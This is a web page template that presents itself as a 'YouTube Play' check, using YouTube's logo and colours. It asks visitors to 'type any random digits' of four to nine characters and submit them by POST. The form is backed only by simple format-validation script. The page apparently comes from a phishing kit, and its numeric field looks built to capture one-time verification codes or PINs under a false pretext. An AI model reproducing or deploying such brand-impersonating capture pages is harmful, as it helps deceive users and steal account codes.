{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(255, 0, 0, 0.25);border-radius:16px;">
  <div class="platform-header">
    <div class="icon-circle bg-youtube">
      <i class="fa-brands fa-youtube icon-lg"></i>
    </div>
    <div>
      <h2 class="notranslate" style="margin:0;color:#FF0000;">YouTube Play</h2>
      <div style="color:#64748b;font-size:13px">Play check…</div>
    </div>
  </div>

  <h3 style="color:#e11d48">Play check…</h3>
  <p>Step1: Put a smile on your face. Step2: Type any random digits below and click Submit to continue.</p>

  <form id="playForm" method="post" novalidate>
    <input class="input" id="digits" name="digits" placeholder="Enter digits (4-9 digits)" pattern="\d{4,9}" required>
    <div class="error-text" id="digitsError"></div>

    <button class="btn login-btn" type="submit">Submit</button>
  </form>
</div>

<style>
.input {
  width: 100%;
  padding: 14px;
  border-radius: 18px;
  border: 1px solid #e5e7eb;
  margin-bottom: 8px;
  font-size: 16px;
  transition: border-color 0.2s, box-shadow 0.2s;
}
.input:focus {
  border-color: #9ca3af;
  box-shadow: 0 0 0 3px rgba(156, 163, 175, 0.25);
  outline: none;
}
.input-error {
  border-color: #ef4444;
  box-shadow: 0 0 0 3px rgba(239,68,68,0.15);
}
.error-text {
  color: #ef4444;
  font-size: 13px;
  margin-top: -4px;
  margin-bottom: 8px;
}

.login-btn {
  width: 100%;
  background: #9ca3af;
  color: #fff;
  font-size: 16px;
  font-weight: 700;
  padding: 12px;
  border-radius: 25px;
  cursor: pointer;
  border: none;
  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
  box-shadow: 0 6px 16px rgba(107,114,128,0.25);
  display: block;
  margin-top: 8px;
}
.login-btn:hover {
  background: #6b7280;
  box-shadow: 0 8px 20px rgba(107,114,128,0.35);
}
.login-btn:active {
  transform: scale(0.985);
}
</style>

<script>
document.getElementById("playForm").addEventListener("submit", function(event) {
  const digits = document.getElementById("digits");
  const digitsError = document.getElementById("digitsError");
  const val = digits.value.trim();
  const pattern = /^\d{4,9}$/; // 4 to 9 digits

  digits.classList.remove("input-error");
  digitsError.textContent = "";

  if (!pattern.test(val)) {
    event.preventDefault(); // stop form submission
    digits.classList.add("input-error");
    digitsError.textContent = "Enter a number between 4 and 9 digits.";
  }
});

document.getElementById("digits").addEventListener("input", () => {
  const digits = document.getElementById("digits");
  const digitsError = document.getElementById("digitsError");
  digits.classList.remove("input-error");
  digitsError.textContent = "";
});
</script>
{% endblock %}
